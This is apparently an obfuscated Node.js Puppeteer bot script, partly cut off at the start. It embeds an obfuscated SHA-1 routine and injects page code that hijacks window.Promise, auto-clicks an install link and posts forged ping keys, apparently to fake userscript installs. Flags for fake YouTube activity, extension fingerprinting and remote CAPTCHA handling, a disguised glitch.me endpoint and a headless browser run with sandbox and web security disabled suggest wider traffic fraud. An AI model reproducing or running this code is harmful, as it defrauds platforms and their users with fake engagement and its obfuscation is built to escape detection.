-0x1b * 0x19c) << y[0x2 * 0xabd + 0x167 * -0x19 + 0xd98 & N++], P[N >> -0x46 * 0x66 + -0x1 * -0x1aa7 + -0x1d * -0xb] |= (0x1 * 0xc31 + -0x2f + -0xb82 | L >> -0x25c7 + -0x1 * -0xce + 0x2505 & 0x20cd + 0x993 + 0x3 * -0xe0b) << y[0x4 * -0x6e5 + 0x22c0 + 0x3 * -0x263 & N++], P[N >> -0x13b3 * 0x1 + 0x23b2 + -0xffd * 0x1] |= (0x1fef + -0xa2b + -0x1544 | L >> 0x2390 * 0x1 + 0xd * 0x1cb + -0xbc5 * 0x5 & 0x74 * 0x1d + -0xe5b + 0x16 * 0x11) << y[0x1 * 0x4fc + -0x5ca + -0x13 * -0xb & N++], P[N >> -0x8a7 + -0x629 + -0x1 * -0xed2] |= (0x4 * -0x392 + -0xbc2 + -0x4f * -0x56 | 0xaa5 * 0x3 + -0x2 * -0xcac + -0x3908 & L) << y[0x29a + 0xda * 0x1 + -0x371 & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= 0x88f * -0x3 + 0x12f9 + 0x6f4 ? (this['block'] = P[-0x616 + 0x6a4 * 0x1 + 0x12 * -0x7], this['start'] = N - (0x11a * 0x1 + 0x23c7 + -0x24a1 * 0x1), this['hash'](), this['hashed'] = -0x2678 + 0x1b * 0x116 + -0x21 * -0x47) : this['start'] = N;
                }
                return this['bytes'] > -0x5c34ae14 + 0x1ca3c1b73 + -0x6e076d60 && (this['hBytes'] += this['bytes'] / (0x44b6764 + -0x10 * -0xc811363 + 0x33a3626c) << -0xcf3 + -0x2184 * 0x1 + 0x2e77, this['bytes'] = this['bytes'] % (0x56 * -0x1355cb2 + -0x1a * -0xc434bd6 + 0x29177010)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = -0x10d1 + 0x473 + 0xc5f;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
                J[-0x19d * -0x13 + 0x17 * 0x5a + 0x1 * -0x26ad] = this['block'], J[K >> 0x1 * 0xc20 + 0x1 * -0x1c9a + -0x41f * -0x4] |= x[0x2 * -0x10c3 + 0xa62 * 0x3 + 0x263 & K], this['block'] = J[0x241 * 0x3 + -0x3a0 * 0x2 + 0x8d], K >= -0x2a1 * -0x1 + 0x24cd * -0x1 + 0x47 * 0x7c && (this['hashed'] || this['hash'](), J[0x159b + 0x1f4b + -0x34e6] = this['block'], J[0x224 * 0x4 + 0x136f * 0x1 + -0x1bef] = J[0x669 + -0x6bb + -0x1 * -0x53] = J[-0x12b5 * -0x2 + 0x1556 + 0x2 * -0x1d5f] = J[0x87 * -0xd + -0x1091 + 0x176f] = J[-0x29 * -0xa4 + 0x162 + -0x1ba2] = J[-0x1d8b + 0x46c + 0x1924] = J[0x206a + 0xaa7 + -0x2b0b] = J[0x238f + 0x153e * -0x1 + -0xe4a] = J[0x4 * 0x2d3 + -0x33b * 0xc + 0x1b80] = J[0x1 * 0x1d53 + -0x1 * -0x91d + -0x2667] = J[-0x1 * -0x170a + -0x1 * -0x943 + 0x3 * -0xac1] = J[-0x2244 + -0x1 * 0x1114 + 0xf * 0x36d] = J[0x4d6 * -0x4 + 0x389 + 0xfdb] = J[0x482 * -0x3 + -0x4 * -0x88f + -0x14a9] = J[0x248f + -0x2041 + -0x88 * 0x8] = J[-0x1b0b + 0x4 * 0x7b2 + -0x3ae] = -0x19c2 + -0x1f * 0x90 + 0x2b32), J[0xcff * 0x1 + 0xb82 * -0x3 + 0x19 * 0xdd] = this['hBytes'] << -0x2092 + 0x21d5 + -0xa0 * 0x2 | this['bytes'] >>> -0x5ba * -0x1 + 0x1e14 + -0x23b1 * 0x1, J[0xbe9 * -0x1 + 0x1 * -0x2089 + -0x1 * -0x2c81] = this['bytes'] << 0x889 * -0x3 + 0xed0 + 0xace, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = -0x1 * 0x1adf + 0x13da * 0x1 + -0x103 * -0x7; J < 0x3ae * -0x1 + -0x2f5 + 0x6f3; ++J)
                K = Q[J - (0xfce + 0xe72 + -0x1 * 0x1e3d)] ^ Q[J - (-0x24fa + -0xc7 * 0x3 + 0x2757 * 0x1)] ^ Q[J - (-0x1 * -0x1cc4 + -0x2149 + 0x493 * 0x1)] ^ Q[J - (-0x10c * 0x19 + -0x1d63 * -0x1 + -0x327)], Q[J] = K << 0x1 * -0x1d6e + -0x5 * -0x3e2 + 0xa05 | K >>> 0xf * -0x1de + 0x1204 + 0xa1d;
              for (J = -0x3 * 0x103 + -0x1891 + -0xdcd * -0x2; J < -0x1db7 + 0x250f + -0x744; J += -0x9 * 0xf + -0x1286 * -0x2 + -0x2480)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x122b * -0x1 + 0x98d * 0x1 + -0x1bb3 | L >>> 0x63 * -0x7 + 0x2521 + 0x6dd * -0x5) + (M & N | ~M & O) + P + (0x4eff11c * 0x24 + -0x5d9 * -0x9b381 + -0x8ff61bb0) + Q[J] << 0x1 * 0x1dfa + 0x183e + -0x3638) << -0x2 * -0xab6 + 0x15e0 + 0x3 * -0xe6d | P >>> -0x139 + 0x1 * -0x6ce + 0x822 * 0x1) + (L & (M = M << 0x1a7a + 0x1d8e + -0x37ea | M >>> -0x1316 * -0x2 + 0xadb + -0x3105) | ~L & N) + O + (-0xf144 * 0x32b5 + -0x5bcd4a35 + -0x461 * -0x348c22) + Q[J + (-0x2 * 0x9d + -0x1 * 0x10da + 0x1215)] << -0x792 + -0xd6 * 0x2 + -0x5b * -0x1a) << -0x17f * 0x17 + -0x8b * 0x25 + 0x3685 | O >>> 0x3b7 * -0x1 + -0x46d * 0x5 + -0x1 * -0x19f3) + (P & (L = L << 0x1ffa * 0x1 + 0x1dfd + -0x3dd9 | L >>> -0x1812 + 0xb * -0x359 + 0x3ce7) | ~P & M) + N + (-0x2a2a58de + 0x5 * 0x43192f5 + 0x6fb4f3ae) + Q[J + (-0x1384 + 0x2 * 0xaa0 + 0x22 * -0xd)] << 0x727 * 0x1 + -0xfe1 + -0x1 * -0x8ba) << 0x1a92 + -0x1e80 + -0x3 * -0x151 | N >>> -0x2230 + -0x65 * 0x4c + 0x449 * 0xf) + (O & (P = P << -0x85 + -0xff5 + 0x1098 | P >>> -0x6a * -0x58 + -0x230 * -0x3 + 0x157f * -0x2) | ~O & L) + M + (0x36a2112b + 0x6d45e009 + -0x340c63 * 0x169) + Q[J + (0xf16 * 0x1 + -0x1 * -0x92 + -0xfa5)] << -0x1045 + -0x2 * 0x1fd + 0x143f) << -0xdde + -0x1f27 + -0x481 * -0xa | M >>> -0x1b4a + 0x179c + 0x3c9) + (N & (O = O << -0x87a + 0x1 * 0x2536 + -0x1c9e | O >>> -0x1651 + 0x277 * -0x1 + -0x2 * -0xc65) | ~N & P) + L + (-0xb4987ae6 + 0x3b9f * 0x1a45e + -0x5d * -0x1dcc6c1) + Q[J + (-0x1036 + -0x677 * 0x1 + -0x9d * -0x25)] << -0x496 * -0x5 + 0x1a9a + -0x3188, N = N << 0x73d * 0x1 + -0xd * 0x6 + 0x5 * -0x15d | N >>> -0x10b9 + -0x1da7 + 0x2e62;
              for (; J < -0x1 * 0x1aab + 0x121 + 0x19b2; J += 0x2056 + -0x2 * -0x85f + 0x13 * -0x295)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x124d + 0x11ef * -0x2 + 0x3630 | L >>> -0x1 * 0x17f2 + -0xc5e + 0x1 * 0x246b) + (M ^ N ^ O) + P + (0x143e6b20 + -0xd2c315ae + 0x12d5e962f) + Q[J] << -0xb8 * -0x22 + 0x1 * 0x22c5 + -0x3b35) << 0x2576 + 0xa5 * -0xb + -0x1e5a | P >>> -0x2114 * -0x1 + -0x2212 + 0x119) + (L ^ (M = M << 0x1dba + -0xf1 + 0x1cab * -0x1 | M >>> -0x1111 * 0x1 + -0x204b + 0x315e) ^ N) + O + (-0x9752f53a + -0x71bb305 * -0xb + -0x2b4a659 * -0x44) + Q[J + (-0x472 * -0x6 + 0xe * 0x59 + -0x1f89)] << 0xf9a + -0x142c + 0x3 * 0x186) << -0x8a7 + -0x26cf + 0x2f7b | O >>> -0x26b * 0xa + -0x185 * -0x2 + 0x1 * 0x153f) + (P ^ (L = L << 0x150f + 0x130d * 0x2 + 0xbcf * -0x5 | L >>> -0x1ac * 0x2 + 0x1 * -0x265b + -0x29b5 * -0x1) ^ M) + N + (-0x2c7 * -0x5a139 + -0x59 * -0xbdd89d + 0x9f1fd3 * 0x2f) + Q[J + (-0x2543 + 0x639 + -0x7c3 * -0x4)] << 0xc1d + -0x1518 + 0x13 * 0x79) << -0x29 * -0xc1 + 0x5a1 * 0x2 + 0xa6 * -0x41 | N >>> -0x5 * -0x286 + 0x9 * 0x13d + 0x8 * -0x2f5) + (O ^ (P = P << 0xc * -0x2d5 + -0x1510 + 0x2 * 0x1b95 | P >>> -0xbf8 + 0xed1 + -0x2d7) ^ L) + M + (0xa8d7d58e + 0xdbf8559b * 0x1 + 0x8afb1fc4 * -0x2) + Q[J + (0xe * 0x227 + -0x5 * 0x448 + 0x1 * -0x8b7)] << 0x4f4 + -0x1c37 * 0x1 + 0x1743) << 0x37f + 0x1 * 0x20b1 + -0xc5 * 0x2f | M >>> -0xf8 * 0xc + 0x1 * -0x2243 + -0x196 * -0x1d) + (N ^ (O = O << -0x12b9 + -0x2ab * 0x7 + 0x2584 | O >>> -0xb1 * -0x25 + 0xa4e * 0x1 + 0xb * -0x343) ^ P) + L + (-0x10f4f41 * -0x73 + -0x3ac1050c + 0xb65cfe * 0x43) + Q[J + (-0x3 * 0x313 + -0x857 + 0x8ca * 0x2)] << -0x2 * -0x8e0 + -0xf7e + 0x2 * -0x121, N = N << -0x23fe + -0x2c5 + 0x10d * 0x25 | N >>> -0x315 * -0x5 + -0x141f + 0x4b8;
              for (; J < -0x1 * 0x2278 + 0x1617 + 0xc9d; J += 0xb59 + 0xd75 + 0x1a7 * -0xf)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x21a7 + -0x67 * 0x4f + 0x1d9 * -0x1 | L >>> -0x1831 + 0x7 * 0x4e7 + -0xa05) + (M & N | M & O | N & O) + P - (0x1 * -0xbb240c6d + -0xc7cd558c + 0xcd0f71b * 0x27) + Q[J] << 0x2085 + -0x26e2 + 0x1 * 0x65d) << 0x13f9 * 0x1 + -0x1c74 + 0x110 * 0x8 | P >>> 0x24b7 + 0x1cc3 * 0x1 + 0xd13 * -0x5) + (L & (M = M << 0x18a3 + 0xc86 + -0x250b | M >>> 0x4 * -0x24f + 0x20ff + -0x17c1) | L & N | M & N) + O - (0x85831e6e + 0x22f78d1 * -0x1b + -0x28f202f * -0xf) + Q[J + (0x99e + 0x1 * -0x932 + -0x1 * 0x6b)] << 0x5 * -0x34b + -0x92c + 0x19a3) << -0x2301 + 0x1da0 + -0x1 * -0x566 | O >>> 0x23ea + 0xa2 * 0x16 + -0x31bb) + (P & (L = L << 0x49a * 0x4 + 0x1 * 0x1d89 + -0x2fd3 | L >>> -0x351 * -0xa + 0x207b + -0x41a3) | P & M | L & M) + N - (-0xb11 * -0xe6d73 + -0x10dab89 * -0xb5 + -0xed6f3a5c) + Q[J + (0x1189 * 0x1 + -0x1 * 0x26e8 + 0x1561)] << -0x5dd * -0x1 + -0x4f3 * 0x5 + 0x12e2) << 0x241a + 0x1 * 0x7e7 + 0x2bfc * -0x1 | N >>> 0x25f2 + -0x13b + -0xd5 * 0x2c) + (O & (P = P << -0x10af + 0xa * -0x3ca + 0x36b1 | P >>> -0x253e * 0x1 + 0x12c9 + -0xa3 * -0x1d) | O & L | P & L) + M - (-0x126ce90a + -0xddb8c352 + 0x1640 * 0xfddee) + Q[J + (-0x7db * -0x2 + 0xf9 * -0xb + -0x500)] << -0x8 * 0x19 + 0x1934 * -0x1 + 0x19fc) << -0xd8b + 0x118 * 0x4 + 0x930 | M >>> 0x1 * -0x26e6 + -0x1183 * -0x1 + 0x157e) + (N & (O = O << 0xd7d + 0x85 * 0x49 + -0x334c | O >>> 0x9 * 0x70 + 0x179 * 0x7 + -0x87 * 0x1b) | N & P | O & P) + L - (0x1 * 0x2a2e7933 + -0x4dc * -0xea91d + -0x87fefb) + Q[J + (0x979 * -0x1 + -0x17f3 + 0x2170)] << 0x1 * -0x1ca1 + -0x26a7 * -0x1 + -0xa06, N = N << -0x1349 + 0xd16 * -0x2 + 0xf31 * 0x3 | N >>> 0x1523 + 0x1499 + 0x2 * -0x14dd;
              for (; J < -0x23a * -0x6 + 0xa43 + 0xdd * -0x1b; J += -0x962 + -0x395 * 0x2 + 0x1091)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0xa6b + 0xa0d * 0x3 + 0x7 * -0x2d1 | L >>> 0x3 * -0x3a5 + -0x1e69 + 0x2973) + (M ^ N ^ O) + P - (-0x14e7739b + -0x352b213b + 0x7fafd300) + Q[J] << -0x25a0 + -0x1 * -0x301 + 0x1 * 0x229f) << -0x1d7 * 0x1 + -0xdd3 * -0x1 + -0xbf7 | P >>> 0x1262 + 0x17 * -0xab + -0x2ea) + (L ^ (M = M << -0x1b26 + 0x201c + -0x4d8 | M >>> 0x1 * -0x4f0 + 0x2673 + -0x9 * 0x3b9) ^ N) + O - (-0x11746e29 + -0x197b9c9 * -0x31 + 0x72 * -0xfa82b) + Q[J + (-0x13c * 0x11 + 0x472 * 0x1 + 0x108b)] << -0x2319 + 0x482 + 0x1e97) << 0x190 + -0x11e4 + -0x87 * -0x1f | O >>> 0x1 * -0x1fc9 + -0x1f52 + 0x3f36) + (P ^ (L = L << 0xd * 0x2d3 + 0x16f0 + -0x1 * 0x3b89 | L >>> 0x20cf + 0x146 * 0x11 + 0x3673 * -0x1) ^ M) + N - (-0x1 * -0x46caede1 + 0x1a334773 + -0x2b60f72a) + Q[J + (0x64c + 0x139c + 0xff * -0x1a)] << -0xb25 * -0x3 + -0x1c22 + 0x54d * -0x1) << 0x1c39 + -0x1ed2 + 0x86 * 0x5 | N >>> 0x3 * 0x41d + 0x9 * 0x117 + -0x160b) + (O ^ (P = P << 0x1bee + 0x1 * 0x26ce + -0x214f * 0x2 | P >>> -0x1243 + -0x8 * -0x310 + 0xb * -0x91) ^ L) + M - (-0x1 * 0x6660c7ea + 0x15 * -0x591413 + -0x93 * -0x11c62b1) + Q[J + (-0x226a + -0x1261 + -0x2ef * -0x12)] << 0x1240 + 0x22ff + -0x353f) << -0x1fe9 + -0x1106 * 0x2 + 0x41fa | M >>> -0xcbf * -0x2 + 0xbc + 0x3 * -0x8b5) + (N ^ (O = O << 0x6b * -0x29 + 0x49e * 0x4 + 0x137 * -0x1 | O >>> -0x1e7f * -0x1 + 0x3b2 * -0x7 + -0x49f) ^ P) + L - (-0x4b633 * 0x959 + 0x5b1ee021 + 0x68980c4) + Q[J + (0x202f + 0x304 * -0xa + 0x67 * -0x5)] << 0x794 * 0x2 + -0x127e + 0x356, N = N << 0x1c9a + -0x1ea4 + 0x228 | N >>> -0x1ad0 + -0xb4c + -0x2 * -0x130f;
              this['h0'] = this['h0'] + L << 0x21e7 + -0x17f * -0x17 + -0x88a * 0x8, this['h1'] = this['h1'] + M << 0x209c + -0x30c + -0x1d90, this['h2'] = this['h2'] + N << -0x7dc + -0x1 * -0x256f + -0x1d93, this['h3'] = this['h3'] + O << -0x20f2 + 0x165b * -0x1 + 0xb * 0x507, this['h4'] = this['h4'] + P << 0x486 * -0x7 + 0x251 * -0xd + 0x3dc7 * 0x1;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> 0x19a * 0x1 + 0x21cc + -0x234a & -0xd72 + -0x1 * -0x1391 + -0x61 * 0x10] + w[J >> -0x5b8 + -0x1e43 + 0x1 * 0x2413 & -0x10f0 + -0x163c + 0x79 * 0x53] + w[J >> 0x20 * 0x65 + 0xc9d * 0x1 + -0x1929 & 0x4 * 0x412 + -0x220f + 0x11d6] + w[J >> 0x1 * 0xb33 + -0x6a * -0x49 + -0x295d & 0x5bb + -0x15 * 0x67 + -0x3 * -0xed] + w[J >> -0x2400 + 0x14 * 0x1a7 + 0x300 & -0x1fec + -0x2270 + 0x426b] + w[J >> 0x113f + -0x6 * 0xef + -0xb9d & -0x4a3 * 0x1 + 0x144a + -0xf98] + w[J >> -0x1e7f + 0x9b * 0x35 + 0xca * -0x2 & 0x1249 + 0x11db + -0xc07 * 0x3] + w[-0x232e * 0x1 + 0x1 * -0x2ae + -0x23b * -0x11 & J] + w[K >> 0x16 * 0xd5 + 0x1c1d + -0x2e4f & 0x509 * 0x2 + -0x796 * -0x2 + -0x192f] + w[K >> 0x13be + -0x1a0a + -0x4 * -0x199 & 0x6 * -0x15a + -0xe88 + 0x1 * 0x16b3] + w[K >> -0xb69 * 0x1 + 0x1 * 0xb15 + 0x68 & 0x1e1f + -0x16a * -0x3 + -0x224e] + w[K >> 0x1 * -0x7b9 + 0x193 * 0x1 + 0x636 * 0x1 & -0x2242 + -0x11a5 + 0x33f6] + w[K >> 0x55 * -0x26 + 0x27d * -0xf + 0x31fd & 0xd30 + 0xa6d + 0xa * -0x25b] + w[K >> 0x7 * -0xf0 + -0x1 * -0x345 + 0x353 & -0x20f6 + 0x20f2 + -0x13 * -0x1] + w[K >> 0x2cd + 0x14c2 * 0x1 + -0x178b & 0x11af + 0x2577 + 0x3 * -0x125d] + w[-0xd8c + -0xdf5 + 0x30 * 0x93 & K] + w[L >> -0x5 * -0x251 + -0x9c1 * 0x1 + -0x1b8 & 0x1d6f + 0x6b * -0x29 + -0xc3d] + w[L >> -0x6ce + -0x22d * -0x6 + -0x628 & -0x73 + -0x1a9d + 0x1b1f] + w[L >> 0x2678 + -0x2 * -0x6e1 + -0x37a * 0xf & -0x1d * 0x1d + 0xe9 * -0x1f + 0x1f8f * 0x1] + w[L >> 0x6 * -0x2ad + -0x45 * -0x23 + 0x3b * 0x1d & -0x1d14 + -0x4 * 0x80d + -0x1 * -0x3d57] + w[L >> 0xbf * -0x7 + 0x234 * 0xc + -0x152b & -0x139d + -0x437 + 0x5 * 0x4c7] + w[L >> 0x611 + -0x29 * -0xbf + -0x24a0 & 0x18ee * 0x1 + 0x1 * 0x10d + -0x19ec] + w[L >> -0x60 * -0x63 + -0x1e6f + -0x6ad & -0xb74 + -0x1096 * -0x2 + -0x5 * 0x455] + w[-0x1241 + -0x8ae * 0x3 + 0x2c5a & L] + w[M >> 0x226a + -0x1 * -0x1b97 + -0x3de5 & 0x165d * -0x1 + 0x5 * -0x4c1 + 0x2e31] + w[M >> -0x27 * -0x6d + -0x243a + 0x31 * 0x67 & -0x2 * 0x9d6 + 0x5b9 + 0xe02] + w[M >> 0x1fbd + 0x2 * -0x3d + -0x1f2f & 0x1dbb + 0x1d3e + -0x2 * 0x1d75] + w[M >> 0x23 * 0x2a + 0x22d9 + -0x2887 & -0x601 + 0x1 * 0x873 + -0x263] + w[M >> -0x2333 + 0x1a9a + 0x8a5 & 0x826 + 0x4 * -0x49d + -0x17b * -0x7] + w[M >> -0xbb5 + -0xb * 0x1da + 0x1 * 0x201b & 0xf4b + 0x2 * -0x107f + 0x11c2] + w[M >> 0x5c + 0x189 * 0x1 + -0xd * 0x25 & -0x47 * -0x65 + -0xfab + 0x1 * -0xc49] + w[0x7 * 0x55a + 0x1acb + -0x2 * 0x2019 & M] + w[N >> -0x4fd * -0x4 + 0x15aa + 0x2e * -0xe7 & -0x820 + -0xdd6 + 0x3 * 0x757] + w[N >> 0x231a + -0x44b * 0x5 + -0x1 * 0xd8b & -0x4 * 0x7e8 + 0x269c + -0xc5 * 0x9] + w[N >> 0x1b36 + 0x17 * -0x19b + -0x6d * -0x17 & 0xb * -0x2d1 + -0x1 * 0xb1 + 0x1fbb * 0x1] + w[N >> 0x3 * -0xc30 + 0x53a + 0x1f66 & -0x2 * 0x8da + -0xb04 + 0x1cc7] + w[N >> 0x1 * 0x219c + -0x1 * -0x2572 + -0x4702 & -0x21bb + 0x3 * -0x45b + 0x2edb * 0x1] + w[N >> -0x7 * -0x49e + 0x34c * 0x6 + 0x3412 * -0x1 & 0x4 * 0x852 + -0x1 * -0xe97 + 0x2fd0 * -0x1] + w[N >> -0x1c1 * 0x6 + -0x138 * 0x1 + -0x12d * -0xa & -0x1040 + -0x5f9 * 0x3 + -0x1 * -0x223a] + w[-0x90f * 0x2 + 0xdd9 + -0x115 * -0x4 & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> -0xe3a + 0x531 + 0x921 & 0x1453 + -0x4cf * -0x5 + -0x2b5f,
                J >> -0xd7c * -0x1 + -0x7a4 + 0x5c8 * -0x1 & -0x2057 * -0x1 + 0x7f3 * 0x1 + -0x274b * 0x1,
                J >> 0x262 + 0x2385 + -0x25df & -0x3b * 0xa7 + -0x757 * 0x3 + -0x43 * -0xeb,
                -0x38f * 0x1 + 0x2 * 0x8a9 + 0x26 * -0x56 & J,
                K >> -0x154d * -0x1 + -0x1ef7 * 0x1 + 0x9c2 * 0x1 & 0x4e1 * 0x3 + 0x1 * 0xbf3 + -0x1997,
                K >> -0x2 * 0x2c + -0x31f + 0x387 & -0x2552 + -0xe * 0x243 + 0x5 * 0xdff,
                K >> -0x71 * -0x1 + -0x25c + -0x1f3 * -0x1 & -0x4 * 0x80f + -0x1030 + -0x3 * -0x1079,
                -0xd39 + -0x122 * 0x18 + 0x64 * 0x6a & K,
                L >> -0x2665 + -0x4 * -0x1ff + -0x3 * -0xa2b & -0x859 + 0x241c + 0x8ec * -0x3,
                L >> -0x2321 + -0x1a3c + 0x3d6d & 0x17 * -0x35 + -0x1 * 0x32f + -0x6d * -0x15,
                L >> 0x32d * 0x4 + 0x194c + -0x25f8 & -0xcaa + -0x181 + -0x2 * -0x795,
                -0x194d + -0x1f6e + 0x39ba & L,
                M >> 0x264b + 0xd9 * -0xb + -0x1ce0 & 0xc9e + 0x86 * -0x3c + -0x5 * -0x3f5,
                M >> 0x87c + -0x1848 + 0x1c * 0x91 & -0x1 * -0x2577 + 0x102c + -0x34a4,
                M >> -0x5db * -0x4 + 0x11ce + -0x2932 & -0x266d + 0x177e + -0x2 * -0x7f7,
                -0x1934 + -0x1132 + 0x2b65 * 0x1 & M,
                N >> 0xd9 * 0xd + 0xa00 + -0x14ed & -0x1a3c + -0x1 * -0x1585 + 0x5b6,
                N >> -0x1 * -0x18dc + 0xaed * 0x2 + -0x2ea6 & -0xfb8 * -0x2 + -0x2 * 0x1161 + 0x451,
                N >> -0xcf9 + -0x10a1 + -0x1da2 * -0x1 & 0x23ab + -0x2373 + -0x1 * -0xc7,
                0x2 * -0x6bf + -0xaf1 + 0x196e & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(0x12f5 + 0x259f + 0x710 * -0x8), (K = new DataView(J))['setUint32'](0xec4 + -0x23 * -0x100 + 0x2 * -0x18e2, this['h0']), K['setUint32'](0x25d2 * -0x1 + -0x2048 + 0x461e, this['h1']), K['setUint32'](-0x551 + 0xfef * 0x1 + -0x1 * 0xa96, this['h2']), K['setUint32'](-0xa8 + -0x1ea7 * -0x1 + -0x1df3, this['h3']), K['setUint32'](0xa16 + 0xe8b + 0x1891 * -0x1, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[0x81b * -0x2 + -0x146d + 0x53 * 0x71];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = -0x1 * 0x180e + 0xfb * 0x2 + 0x2 * 0xb0c;
            J[-0x2 * 0xcc4 + 0x1d50 + -0x16 * 0x2c]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[0x39b * -0x1 + -0x82b + 0xbc6] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), -0x985 + -0x2435 + 0x1fd * 0x17), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = 0x223d + -0x4 * 0x2c + -0x218c;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, -0x1827 + -0x19d5 * -0x1 + -0x5 * -0xd6), Promise['resolve'](-0x79f * 0x1 + 0x220b + -0x1 * 0x1a6b);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = -0x55 * 0xd + 0xd * 0x27f + -0x22a * 0xd; j < -0x195d + -0x47 * 0x7f + 0x3c97 * 0x1; j++)
    i();
}
const NETWORK_PATIENCE = 0x1b3b * 0x1 + -0x2b14 + 0x1 * 0x2f19 + (-0x9b1 + 0xb * -0x293 + 0x31ba) * Math['random'](),
  MM_NETWORK_PATIENCE = (0x11c7 * -0x1 + -0x1 * 0x1ef7 + 0x30c1) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = -0x16dc + 0xeb7 + 0x825; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];
